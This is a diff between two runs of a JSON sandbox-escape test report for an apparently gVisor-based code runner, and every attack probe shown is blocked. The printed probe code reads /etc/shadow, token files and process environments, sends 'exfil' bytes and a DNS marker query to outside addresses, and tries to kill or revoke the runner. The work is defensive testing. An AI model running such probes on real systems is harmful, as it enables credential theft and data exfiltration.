@@ -1,20 +1,19 @@
 {
  "environment": {
-  "date_utc": "2026-11-06T06:37:15Z",
+  "date_utc": "2026-11-06T06:41:21Z",
   "kernel_host": "6.8.0-147-generic",
   "runsc": "runsc version release-20261102.0",
   "platform": "systrap",
   "python": "3.12.3",
-  "git_head": "fatal: not a git repository (or any of the parent directories): .git",
+  "git_head": "5b44cbd",
   "uncommitted_changes_in_sandbox_or_brz": false
  },
  "summary": {
   "total": 32,
-  "passed": 30,
-  "failed": 2,
+  "passed": 31,
+  "failed": 1,
   "errors": 0,
   "failed_ids": [
-   "C01",
    "A24"
   ],
   "error_ids": [],
@@ -30,12 +29,197 @@
    "attempted": "Not an attack. Under the same sandbox: a Python step reads an input CSV and writes JSON, a re-run gives the same hash, a shell step uses sort, awk, grep and sed, and a needs_network step fetches https://example.com with curl through a name pinned in the hosts file (real TLS, certificates from the skeleton's /etc/ssl).",
    "expected": "All of it works. Without this control, 'every attack failed' could just mean 'nothing runs'.",
    "accepted_limitation": "",
-   "result": "FAIL",
-   "duration_s": 0.01,
+   "result": "PASS",
+   "duration_s": 0.72,
    "observed": {
-    "harness": "cannot resolve example.com from the host: [Errno -3] Temporary failure in name resolution"
+    "python": {
+     "exit": 0,
+     "stdout": "kernel 4.19.0-gvisor uid 10001\n",
+     "summary.json": "{\"north\": 15.0, \"south\": 20.0}"
+    },
+    "rerun_identical": true,
+    "shell": {
+     "exit": 0,
+     "stdout": "one\n2\ntools-ok\n",
+     "stderr": ""
+    },
+    "needs_network": {
+     "exit": 0,
+     "stdout": "HTTP 200",
+     "stderr": ""
+    },
+    "scan_clean": true
    },
-   "steps": []
+   "steps": [
+    {
+     "step_id": "s1",
+     "kind": "python",
+     "code": "\nimport csv, json, os\nrows = list(csv.DictReader(open(os.path.join(os.environ['BRZ_INPUT'], 'sales.csv'))))\ntot = {}\nfor r in rows:\n    tot[r['region']] = tot.get(r['region'], 0) + float(r['amount'])\njson.dump(dict(sorted(tot.items())), open(os.path.join(os.environ['BRZ_OUT'], 'summary.json'), 'w'), sort_keys=True)\nprint('kernel', os.uname().release, 'uid', os.getuid())\n",
+     "needs_network": false,
+     "timeout_s": 20,
+     "http_status": 200,
+     "wall_s": 0.119,
+     "executor": "gvisor-systrap",
+     "exit_code": 0,
+     "timed_out": false,
+     "stdout_tail": "kernel 4.19.0-gvisor uid 10001\n",
+     "stderr_tail": "",
+     "error": "",
+     "output_files": {
+      "summary.json": {
+       "size": 30,
+       "sha256": "31aaa7700251dbc2479246e3f8fe7ca9b858775481bc9e6ea2e2570cd7e0528b"
+      }
+     },
+     "response_keys": [
+      "duration_s",
+      "egress_attempts",
+      "error",
+      "executor",
+      "exit_code",
+      "files",
+      "missing_expected_outputs",
+      "secret_findings",
+      "skipped_outputs",
+      "stderr",
+      "stderr_sha256",
+      "stderr_truncated",
+      "stdout",
+      "stdout_sha256",
+      "stdout_truncated",
+      "step_id",
+      "timed_out"
+     ]
+    },
+    {
+     "step_id": "s1b",
+     "kind": "python",
+     "code": "\nimport csv, json, os\nrows = list(csv.DictReader(open(os.path.join(os.environ['BRZ_INPUT'], 'sales.csv'))))\ntot = {}\nfor r in rows:\n    tot[r['region']] = tot.get(r['region'], 0) + float(r['amount'])\njson.dump(dict(sorted(tot.items())), open(os.path.join(os.environ['BRZ_OUT'], 'summary.json'), 'w'), sort_keys=True)\nprint('kernel', os.uname().release, 'uid', os.getuid())\n",
+     "needs_network": false,
+     "timeout_s": 20,
+     "http_status": 200,
+     "wall_s": 0.118,
+     "executor": "gvisor-systrap",
+     "exit_code": 0,
+     "timed_out": false,
+     "stdout_tail": "kernel 4.19.0-gvisor uid 10001\n",
+     "stderr_tail": "",
+     "error": "",
+     "output_files": {
+      "summary.json": {
+       "size": 30,
+       "sha256": "31aaa7700251dbc2479246e3f8fe7ca9b858775481bc9e6ea2e2570cd7e0528b"
+      }
+     },
+     "response_keys": [
+      "duration_s",
+      "egress_attempts",
+      "error",
+      "executor",
+      "exit_code",
+      "files",
+      "missing_expected_outputs",
+      "secret_findings",
+      "skipped_outputs",
+      "stderr",
+      "stderr_sha256",
+      "stderr_truncated",
+      "stdout",
+      "stdout_sha256",
+      "stdout_truncated",
+      "step_id",
+      "timed_out"
+     ]
+    },
+    {
+     "step_id": "s2",
+     "kind": "shell",
+     "code": "printf 'b 2\\na 1\\n' | sort | awk '{print $2}' | grep -v 9 | sed 's/1/one/' > /work/out/s.txt; cat /work/out/s.txt; ls /usr/bin/python3 >/dev/null && echo tools-ok",
+     "needs_network": false,
+     "timeout_s": 20,
+     "http_status": 200,
+     "wall_s": 0.168,
+     "executor": "gvisor-systrap",
+     "exit_code": 0,
+     "timed_out": false,
+     "stdout_tail": "one\n2\ntools-ok\n",
+     "stderr_tail": "",
+     "error": "",
+     "output_files": {
+      "s.txt": {
+       "size": 6,
+       "sha256": "b8c083898d90038ced2e04df2f932eefa7d187080dee0d9942be12c156d95034"
+      },
+      "summary.json": {
+       "size": 30,
+       "sha256": "31aaa7700251dbc2479246e3f8fe7ca9b858775481bc9e6ea2e2570cd7e0528b"
+      }
+     },
+     "response_keys": [
+      "duration_s",
+      "egress_attempts",
+      "error",
+      "executor",
+      "exit_code",
+      "files",
+      "missing_expected_outputs",
+      "secret_findings",
+      "skipped_outputs",
+      "stderr",
+      "stderr_sha256",
+      "stderr_truncated",
+      "stdout",
+      "stdout_sha256",
+      "stdout_truncated",
+      "step_id",
+      "timed_out"
+     ]
+    },
+    {
+     "step_id": "s3",
+     "kind": "shell",
+     "code": "curl -m 15 -sS -o /dev/null -w 'HTTP %{http_code}' https://example.com",
+     "needs_network": true,
+     "timeout_s": 30,
+     "http_status": 200,
+     "wall_s": 0.168,
+     "executor": "gvisor-systrap",
+     "exit_code": 0,
+     "timed_out": false,
+     "stdout_tail": "HTTP 200",
+     "stderr_tail": "",
+     "error": "",
+     "output_files": {
+      "s.txt": {
+       "size": 6,
+       "sha256": "b8c083898d90038ced2e04df2f932eefa7d187080dee0d9942be12c156d95034"
+      },
+      "summary.json": {
+       "size": 30,
+       "sha256": "31aaa7700251dbc2479246e3f8fe7ca9b858775481bc9e6ea2e2570cd7e0528b"
+      }
+     },
+     "response_keys": [
+      "duration_s",
+      "egress_attempts",
+      "error",
+      "executor",
+      "exit_code",
+      "files",
+      "missing_expected_outputs",
+      "secret_findings",
+      "skipped_outputs",
+      "stderr",
+      "stderr_sha256",
+      "stderr_truncated",
+      "stdout",
+      "stdout_sha256",
+      "stdout_truncated",
+      "step_id",
+      "timed_out"
+     ]
+    }
+   ]
   },
   {
    "id": "A01",
@@ -45,7 +229,7 @@
    "expected": "Every write fails inside the sandbox; no new file exists on the host afterwards.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.21,
+   "duration_s": 0.24,
    "observed": {
     "inside_sandbox": {
      "/etc/brz-pwn": "Permission denied",
@@ -119,15 +303,15 @@
      "/root/brz-canary-root.txt": "ERR No such file or directory",
      "/etc/shadow": "ERR No such file or directory",
      "/opt/brz-canary/public.txt": "ERR No such file or directory",
-     "/proc/6023/environ": "ERR No such file or directory",
-     "/proc/6023/cmdline": "ERR No such file or directory"
+     "/proc/6200/environ": "ERR No such file or directory",
+     "/proc/6200/cmdline": "ERR No such file or directory"
     }
    },
    "steps": [
     {
      "step_id": "s1",
      "kind": "python",
-     "code": "\nimport json, os\nres = {'read': {}, 'list': {}}\nfor p in ['/etc/brz/token.key', '/root/brz-canary-root.txt', '/etc/shadow', '/opt/brz-canary/public.txt', '/proc/6023/environ', '/proc/6023/cmdline']:\n    try:\n        res['read'][p] = open(p, 'rb').read(200).decode('utf-8', 'replace')\n    except OSError as e:\n        res['read'][p] = 'ERR ' + (e.strerror or str(e))\nfor d in ['/mnt/c', '/mnt/d', '/var/lib/brz/bundles', '/root', '/opt', '/srv', '/home']:\n    try:\n        res['list'][d] = len(os.listdir(d))  # a count only: the evidence must not publish this box's folder names\n    except OSError as e:\n        res['list'][d] = 'ERR ' + (e.strerror or str(e))\nprint(json.dumps(res))\n",
+     "code": "\nimport json, os\nres = {'read': {}, 'list': {}}\nfor p in ['/etc/brz/token.key', '/root/brz-canary-root.txt', '/etc/shadow', '/opt/brz-canary/public.txt', '/proc/6200/environ', '/proc/6200/cmdline']:\n    try:\n        res['read'][p] = open(p, 'rb').read(200).decode('utf-8', 'replace')\n    except OSError as e:\n        res['read'][p] = 'ERR ' + (e.strerror or str(e))\nfor d in ['/mnt/c', '/mnt/d', '/var/lib/brz/bundles', '/root', '/opt', '/srv', '/home']:\n    try:\n        res['list'][d] = len(os.listdir(d))  # a count only: the evidence must not publish this box's folder names\n    except OSError as e:\n        res['list'][d] = 'ERR ' + (e.strerror or str(e))\nprint(json.dumps(res))\n",
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
@@ -135,7 +319,7 @@
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
-     "stdout_tail": "{\"read\": {\"/etc/brz/token.key\": \"ERR No such file or directory\", \"/root/brz-canary-root.txt\": \"ERR No such file or directory\", \"/etc/shadow\": \"ERR No such file or directory\", \"/opt/brz-canary/public.txt\": \"ERR No such file or directory\", \"/proc/6023/environ\": \"ERR No such file or directory\", \"/proc/6023/cmdline\": \"ERR No such file or directory\"}, \"list\": {\"/mnt/c\": \"ERR No such file or directory\", \"/mnt/d\": \"ERR No such file or directory\", \"/var/lib/brz/bundles\": \"ERR No such file or directory\", \"/root\": \"ERR No such file or directory\", \"/opt\": \"ERR No such file or directory\", \"/srv\": \"ERR No such file or directory\", \"/home\": \"ERR No such file or directory\"}}\n",
+     "stdout_tail": "{\"read\": {\"/etc/brz/token.key\": \"ERR No such file or directory\", \"/root/brz-canary-root.txt\": \"ERR No such file or directory\", \"/etc/shadow\": \"ERR No such file or directory\", \"/opt/brz-canary/public.txt\": \"ERR No such file or directory\", \"/proc/6200/environ\": \"ERR No such file or directory\", \"/proc/6200/cmdline\": \"ERR No such file or directory\"}, \"list\": {\"/mnt/c\": \"ERR No such file or directory\", \"/mnt/d\": \"ERR No such file or directory\", \"/var/lib/brz/bundles\": \"ERR No such file or directory\", \"/root\": \"ERR No such file or directory\", \"/opt\": \"ERR No such file or directory\", \"/srv\": \"ERR No such file or directory\", \"/home\": \"ERR No such file or directory\"}}\n",
      "stderr_tail": "",
      "error": "",
      "output_files": {},
@@ -244,14 +428,14 @@
    "expected": "The runner answers within the HTTP timeout, stays alive and stays under the memory guard.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.47,
+   "duration_s": 0.48,
    "observed": {
     "fifo": {
      "http_status": 200,
      "wall_s": 0.12,
      "runner_alive": true,
      "rss_guard_tripped": false,
-     "runner_peak_rss_mb": 22.6,
+     "runner_peak_rss_mb": 22.7,
      "stdout": "fifo planted\n",
      "skipped_outputs": []
     },
@@ -430,7 +614,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.068,
+     "wall_s": 0.069,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -465,7 +649,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.117,
+     "wall_s": 0.119,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -605,7 +789,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.117,
+     "wall_s": 0.118,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -675,7 +859,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.118,
+     "wall_s": 0.117,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -766,18 +950,18 @@
     "pids_inside": [
      1
     ],
-    "runner_pid_on_host": 6625,
+    "runner_pid_on_host": 6806,
     "runner_pid_visible": false,
     "runner_alive_after_kill": true,
     "kill_results": {
-     "kill_6625": "No such process"
+     "kill_6806": "No such process"
     }
    },
    "steps": [
     {
      "step_id": "s1",
      "kind": "python",
-     "code": "\nimport json, os, platform, signal\npids = sorted(int(p) for p in os.listdir('/proc') if p.isdigit())\nres = {'pids': pids, 'kernel': platform.release(), 'version': open('/proc/version').read()[:80]}\ntry:\n    os.kill(6625, signal.SIGKILL); res['kill_6625'] = 'sent'\nexcept OSError as e:\n    res['kill_6625'] = e.strerror\nprint(json.dumps(res))\n",
+     "code": "\nimport json, os, platform, signal\npids = sorted(int(p) for p in os.listdir('/proc') if p.isdigit())\nres = {'pids': pids, 'kernel': platform.release(), 'version': open('/proc/version').read()[:80]}\ntry:\n    os.kill(6806, signal.SIGKILL); res['kill_6806'] = 'sent'\nexcept OSError as e:\n    res['kill_6806'] = e.strerror\nprint(json.dumps(res))\n",
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
@@ -785,7 +969,7 @@
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
-     "stdout_tail": "{\"pids\": [1], \"kernel\": \"4.19.0-gvisor\", \"version\": \"Linux version 4.19.0-gvisor #1 SMP Sun Jan 10 15:06:54 PST 2016\\n\", \"kill_6625\": \"No such process\"}\n",
+     "stdout_tail": "{\"pids\": [1], \"kernel\": \"4.19.0-gvisor\", \"version\": \"Linux version 4.19.0-gvisor #1 SMP Sun Jan 10 15:06:54 PST 2016\\n\", \"kill_6806\": \"No such process\"}\n",
      "stderr_tail": "",
      "error": "",
      "output_files": {},
@@ -861,7 +1045,7 @@
      "needs_network": false,
      "timeout_s": 30,
      "http_status": 200,
-     "wall_s": 1.17,
+     "wall_s": 1.171,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -899,7 +1083,7 @@
    "expected": "The bomb stops near the 256 pid limit (forks and host processes both at most 300), the runner keeps answering /health, every process is gone after the step, and the next step works.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 3.58,
+   "duration_s": 3.61,
    "observed": {
     "python_bomb": {
      "forks_achieved": 75,
@@ -908,9 +1092,9 @@
     },
     "python_bomb_host": {
      "peak_host_processes": 207,
-     "peak_host_threads": 226,
-     "peak_host_rss_mb": 1866.0,
-     "runner_health_worst_ms": 4.0,
+     "peak_host_threads": 228,
+     "peak_host_rss_mb": 1880.6,
+     "runner_health_worst_ms": 4.3,
      "runner_health_failures": 0
     },
     "shell_bomb": {
@@ -920,8 +1104,8 @@
     "shell_bomb_host": {
      "peak_host_processes": 232,
      "peak_host_threads": 263,
-     "peak_host_rss_mb": 195.5,
-     "runner_health_worst_ms": 5.2,
+     "peak_host_rss_mb": 191.5,
+     "runner_health_worst_ms": 2.8,
      "runner_health_failures": 0
     },
     "processes_left_after": [],
@@ -935,7 +1119,7 @@
      "needs_network": false,
      "timeout_s": 25,
      "http_status": 200,
-     "wall_s": 1.753,
+     "wall_s": 1.779,
      "executor": "gvisor-systrap",
      "exit_code": 137,
      "timed_out": false,
@@ -1005,7 +1189,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.118,
+     "wall_s": 0.119,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -1043,7 +1227,7 @@
    "expected": "The step cannot hold much more than the limit (allowance 10 percent) and the runner survives.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 1.82,
+   "duration_s": 1.85,
    "observed": {
     "step_peak_mib": 512,
     "limit_mib": 573,
@@ -1052,9 +1236,9 @@
     "stderr_tail": "",
     "host": {
      "peak_host_processes": 7,
-     "peak_host_threads": 33,
-     "peak_host_rss_mb": 1106.6,
-     "runner_health_worst_ms": 3.6,
+     "peak_host_threads": 34,
+     "peak_host_rss_mb": 1108.3,
+     "runner_health_worst_ms": 4.9,
      "runner_health_failures": 0
     },
     "runner_alive": true,
@@ -1068,7 +1252,7 @@
      "needs_network": false,
      "timeout_s": 90,
      "http_status": 200,
-     "wall_s": 1.19,
+     "wall_s": 1.218,
      "executor": "gvisor-systrap",
      "exit_code": 137,
      "timed_out": false,
@@ -1106,11 +1290,11 @@
    "expected": "exit 124 close to 3 s, and no sandbox process left on the host.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 4.14,
+   "duration_s": 4.15,
    "observed": {
     "exit_code": 124,
     "timed_out": true,
-    "wall_s": 3.01,
+    "wall_s": 3.02,
     "processes_left_after": [],
     "runsc_containers_left": []
    },
@@ -1122,7 +1306,7 @@
      "needs_network": false,
      "timeout_s": 3,
      "http_status": 200,
-     "wall_s": 3.011,
+     "wall_s": 3.018,
      "executor": "gvisor-systrap",
      "exit_code": 124,
      "timed_out": true,
@@ -1160,16 +1344,16 @@
    "expected": "Both writes stop at their limit (10 percent allowance on the /work quota) and nothing large is returned.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 2.73,
+   "duration_s": 2.64,
    "observed": {
     "tmp_mib_written": 256,
-    "work_mib_on_host": 2053,
+    "work_mib_on_host": 2084,
     "inside": {
      "/tmp/fill:error": "No space left on device",
      "/tmp/fill": 256
     },
     "exit_code": 125,
-    "error": "work quota exceeded: 2151702528 bytes used, limit 2147483648",
+    "error": "work quota exceeded: 2185375744 bytes used, limit 2147483648",
     "stdout_tail": "6}\n/work/out/fill 256\n/work/out/fill 512\n/work/out/fill 768\n/work/out/fill 1024\n/work/out/fill 1280\n/work/out/fill 1536\n/work/out/fill 1792\n/work/out/fill 2048\n",
     "returned_mib": 0.0
    },
@@ -1181,13 +1365,13 @@
      "needs_network": false,
      "timeout_s": 120,
      "http_status": 200,
-     "wall_s": 2.604,
+     "wall_s": 2.491,
      "executor": "gvisor-systrap",
      "exit_code": 125,
      "timed_out": false,
      "stdout_tail": "/tmp/fill 256\n{\"/tmp/fill:error\": \"No space left on device\", \"/tmp/fill\": 256}\n/work/out/fill 256\n/work/out/fill 512\n/work/out/fill 768\n/work/out/fill 1024\n/work/out/fill 1280\n/work/out/fill 1536\n/work/out/fill 1792\n/work/out/fill 2048\n",
      "stderr_tail": "",
-     "error": "work quota exceeded: 2151702528 bytes used, limit 2147483648",
+     "error": "work quota exceeded: 2185375744 bytes used, limit 2147483648",
      "output_files": {},
      "response_keys": [
       "duration_s",
@@ -1219,7 +1403,7 @@
    "expected": "Runner memory grows by less than 64 MiB and stdout comes back capped.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 6.2,
+   "duration_s": 6.25,
    "observed": {
     "http_status": 200,
     "runner_rss_growth_mib": 15.3,
@@ -1236,7 +1420,7 @@
      "needs_network": false,
      "timeout_s": 6,
      "http_status": 200,
-     "wall_s": 6.082,
+     "wall_s": 6.08,
      "executor": "gvisor-systrap",
      "exit_code": 124,
      "timed_out": true,
@@ -1274,12 +1458,12 @@
    "expected": "The heartbeat stops when the step ends and no process remains.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 4.75,
+   "duration_s": 4.74,
    "observed": {
     "wall_s": 1.12,
     "exit_code": 0,
-    "heartbeat_size_1_5s_after": 186,
-    "heartbeat_size_3_5s_after": 186,
+    "heartbeat_size_1_5s_after": 188,
+    "heartbeat_size_3_5s_after": 188,
     "processes_left_after": []
    },
    "steps": [
@@ -1299,8 +1483,8 @@
      "error": "",
      "output_files": {
       "daemon.txt": {
-       "size": 186,
-       "sha256": "823c0eaf4030e7bf3118c58b294ef879adbf87cd567f44ce77fc7b5e0f7474e8"
+       "size": 188,
+       "sha256": "c7e0d2e65b37092ed24ceb901f6de241fe786ec089732019494b517558f6ce06"
       }
      },
      "response_keys": [
@@ -1333,7 +1517,7 @@
    "expected": "Step 2 starts with a fresh /tmp. /work is shared on purpose.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.36,
+   "duration_s": 0.35,
    "observed": {
     "stdout": "marker False"
    },
@@ -1345,7 +1529,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.119,
+     "wall_s": 0.118,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -1380,7 +1564,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.119,
+     "wall_s": 0.118,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -1421,12 +1605,12 @@
    "duration_s": 0.61,
    "observed": {
     "inside": {
-     "127.0.0.1:32877": "Connection refused",
-     "108.61.81.90:32877": "Network is unreachable",
+     "127.0.0.1:34885": "Connection refused",
+     "64.237.48.144:34885": "Network is unreachable",
      "1.1.1.1:443": "Network is unreachable",
      "curl": {
-      "rc": 6,
-      "err": "curl: (6) Could not resolve host: example.com"
+      "rc": 7,
+      "err": "curl: (7) Failed to connect to example.com port 443 after 1 ms: Couldn't connect to server"
      },
      "net_dev": [
       "lo"
@@ -1438,15 +1622,15 @@
     {
      "step_id": "s1",
      "kind": "python",
-     "code": "\nimport json, socket, subprocess\nres = {}\nfor host, port in (('127.0.0.1', 32877), ('108.61.81.90', 32877), ('1.1.1.1', 443)):\n    try:\n        s = socket.create_connection((host, port), timeout=3); s.send(b'exfil'); s.close()\n        res['%s:%d' % (host, port)] = 'CONNECTED'\n    except OSError as e:\n        res['%s:%d' % (host, port)] = e.strerror or type(e).__name__\np = subprocess.run(['curl', '-m', '5', '-sS', 'https://example.com'], capture_output=True, text=True, timeout=10)\nres['curl'] = {'rc': p.returncode, 'err': p.stderr.strip()[:100]}\ntry:\n    res['net_dev'] = [l.split(':')[0].strip() for l in open('/proc/net/dev').read().splitlines()[2:]]\nexcept OSError as e:\n    res['net_dev'] = e.strerror\nprint(json.dumps(res))\n",
+     "code": "\nimport json, socket, subprocess\nres = {}\nfor host, port in (('127.0.0.1', 34885), ('64.237.48.144', 34885), ('1.1.1.1', 443)):\n    try:\n        s = socket.create_connection((host, port), timeout=3); s.send(b'exfil'); s.close()\n        res['%s:%d' % (host, port)] = 'CONNECTED'\n    except OSError as e:\n        res['%s:%d' % (host, port)] = e.strerror or type(e).__name__\np = subprocess.run(['curl', '-m', '5', '-sS', 'https://example.com'], capture_output=True, text=True, timeout=10)\nres['curl'] = {'rc': p.returncode, 'err': p.stderr.strip()[:100]}\ntry:\n    res['net_dev'] = [l.split(':')[0].strip() for l in open('/proc/net/dev').read().splitlines()[2:]]\nexcept OSError as e:\n    res['net_dev'] = e.strerror\nprint(json.dumps(res))\n",
      "needs_network": false,
      "timeout_s": 30,
      "http_status": 200,
-     "wall_s": 0.17,
+     "wall_s": 0.168,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
-     "stdout_tail": "{\"127.0.0.1:32877\": \"Connection refused\", \"108.61.81.90:32877\": \"Network is unreachable\", \"1.1.1.1:443\": \"Network is unreachable\", \"curl\": {\"rc\": 6, \"err\": \"curl: (6) Could not resolve host: example.com\"}, \"net_dev\": [\"lo\"]}\n",
+     "stdout_tail": "{\"127.0.0.1:34885\": \"Connection refused\", \"64.237.48.144:34885\": \"Network is unreachable\", \"1.1.1.1:443\": \"Network is unreachable\", \"curl\": {\"rc\": 7, \"err\": \"curl: (7) Failed to connect to example.com port 443 after 1 ms: Couldn't connect to server\"}, \"net_dev\": [\"lo\"]}\n",
      "stderr_tail": "",
      "error": "",
      "output_files": {},
@@ -1485,8 +1669,8 @@
     "inside": {
      "getaddrinfo": "ERR [Errno -2] Name or service not known",
      "1.1.1.1:53": "Network is unreachable",
-     "108.61.81.90:57274": "Network is unreachable",
-     "127.0.0.1:57274": "SENT, no reply: TimeoutError"
+     "64.237.48.144:47700": "Network is unreachable",
+     "127.0.0.1:47700": "SENT, no reply: TimeoutError"
     },
     "host_listener_hits": []
    },
@@ -1494,15 +1678,15 @@
     {
      "step_id": "s1",
      "kind": "python",
-     "code": "\nimport json, socket\nres = {}\ntry:\n    res['getaddrinfo'] = str(socket.getaddrinfo('exfil-marker-a17.example.com', 80)[:1])\nexcept OSError as e:\n    res['getaddrinfo'] = 'ERR ' + str(e)\nqname = b''.join(bytes([len(p)]) + p for p in b'exfil-marker-a17.example.com'.split(b'.')) + b'\\0'\nquery = b'\\x12\\x34\\x01\\0\\0\\x01\\0\\0\\0\\0\\0\\0' + qname + b'\\0\\x01\\0\\x01'\nfor host, port in (('1.1.1.1', 53), ('108.61.81.90', 57274), ('127.0.0.1', 57274)):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)\n        s.sendto(query, (host, port))\n        try:\n            res['%s:%d' % (host, port)] = 'SENT, reply ' + repr(s.recv(64))\n        except OSError as e:\n            res['%s:%d' % (host, port)] = 'SENT, no reply: ' + type(e).__name__\n    except OSError as e:\n        res['%s:%d' % (host, port)] = e.strerror or type(e).__name__\nprint(json.dumps(res))\n",
+     "code": "\nimport json, socket\nres = {}\ntry:\n    res['getaddrinfo'] = str(socket.getaddrinfo('exfil-marker-a17.example.com', 80)[:1])\nexcept OSError as e:\n    res['getaddrinfo'] = 'ERR ' + str(e)\nqname = b''.join(bytes([len(p)]) + p for p in b'exfil-marker-a17.example.com'.split(b'.')) + b'\\0'\nquery = b'\\x12\\x34\\x01\\0\\0\\x01\\0\\0\\0\\0\\0\\0' + qname + b'\\0\\x01\\0\\x01'\nfor host, port in (('1.1.1.1', 53), ('64.237.48.144', 47700), ('127.0.0.1', 47700)):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)\n        s.sendto(query, (host, port))\n        try:\n            res['%s:%d' % (host, port)] = 'SENT, reply ' + repr(s.recv(64))\n        except OSError as e:\n            res['%s:%d' % (host, port)] = 'SENT, no reply: ' + type(e).__name__\n    except OSError as e:\n        res['%s:%d' % (host, port)] = e.strerror or type(e).__name__\nprint(json.dumps(res))\n",
      "needs_network": false,
      "timeout_s": 30,
      "http_status": 200,
-     "wall_s": 2.122,
+     "wall_s": 2.123,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
-     "stdout_tail": "{\"getaddrinfo\": \"ERR [Errno -2] Name or service not known\", \"1.1.1.1:53\": \"Network is unreachable\", \"108.61.81.90:57274\": \"Network is unreachable\", \"127.0.0.1:57274\": \"SENT, no reply: TimeoutError\"}\n",
+     "stdout_tail": "{\"getaddrinfo\": \"ERR [Errno -2] Name or service not known\", \"1.1.1.1:53\": \"Network is unreachable\", \"64.237.48.144:47700\": \"Network is unreachable\", \"127.0.0.1:47700\": \"SENT, no reply: TimeoutError\"}\n",
      "stderr_tail": "",
      "error": "",
      "output_files": {},
@@ -1539,10 +1723,10 @@
    "duration_s": 0.34,
    "observed": {
     "inside": {
-     "http://127.0.0.1:47489/health": "URLError: <urlopen error [Errno 111] Connection refused>",
-     "http://127.0.0.1:47489/revoke": "URLError: <urlopen error [Errno 111] Connection refused>",
-     "http://108.61.81.90:47489/health": "URLError: <urlopen error [Errno 101] Network is unreachable>",
-     "http://108.61.81.90:47489/revoke": "URLError: <urlopen error [Errno 101] Network is unreachable>"
+     "http://127.0.0.1:54125/health": "URLError: <urlopen error [Errno 111] Connection refused>",
+     "http://127.0.0.1:54125/revoke": "URLError: <urlopen error [Errno 111] Connection refused>",
+     "http://64.237.48.144:54125/health": "URLError: <urlopen error [Errno 101] Network is unreachable>",
+     "http://64.237.48.144:54125/revoke": "URLError: <urlopen error [Errno 101] Network is unreachable>"
     },
     "reached": [],
     "runner_revoked": false
@@ -1551,7 +1735,7 @@
     {
      "step_id": "s1",
      "kind": "python",
-     "code": "\nimport json, urllib.request\nres = {}\nfor host in ('127.0.0.1', '108.61.81.90'):\n    for path, data in (('/health', None), ('/revoke', b'{}')):\n        url = 'http://%s:47489%s' % (host, path)\n        try:\n            res[url] = urllib.request.urlopen(url, data=data, timeout=3).status\n        except Exception as e:\n            res[url] = type(e).__name__ + ': ' + str(e)[:80]\nprint(json.dumps(res))\n",
+     "code": "\nimport json, urllib.request\nres = {}\nfor host in ('127.0.0.1', '64.237.48.144'):\n    for path, data in (('/health', None), ('/revoke', b'{}')):\n        url = 'http://%s:54125%s' % (host, path)\n        try:\n            res[url] = urllib.request.urlopen(url, data=data, timeout=3).status\n        except Exception as e:\n            res[url] = type(e).__name__ + ': ' + str(e)[:80]\nprint(json.dumps(res))\n",
      "needs_network": false,
      "timeout_s": 30,
      "http_status": 200,
@@ -1559,7 +1743,7 @@
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
-     "stdout_tail": "{\"http://127.0.0.1:47489/health\": \"URLError: <urlopen error [Errno 111] Connection refused>\", \"http://127.0.0.1:47489/revoke\": \"URLError: <urlopen error [Errno 111] Connection refused>\", \"http://108.61.81.90:47489/health\": \"URLError: <urlopen error [Errno 101] Network is unreachable>\", \"http://108.61.81.90:47489/revoke\": \"URLError: <urlopen error [Errno 101] Network is unreachable>\"}\n",
+     "stdout_tail": "{\"http://127.0.0.1:54125/health\": \"URLError: <urlopen error [Errno 111] Connection refused>\", \"http://127.0.0.1:54125/revoke\": \"URLError: <urlopen error [Errno 111] Connection refused>\", \"http://64.237.48.144:54125/health\": \"URLError: <urlopen error [Errno 101] Network is unreachable>\", \"http://64.237.48.144:54125/revoke\": \"URLError: <urlopen error [Errno 101] Network is unreachable>\"}\n",
      "stderr_tail": "",
      "error": "",
      "output_files": {},
@@ -1627,7 +1811,7 @@
      "needs_network": true,
      "timeout_s": 30,
      "http_status": 200,
-     "wall_s": 9.099,
+     "wall_s": 9.147,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -1742,7 +1926,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.121,
+     "wall_s": 0.118,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
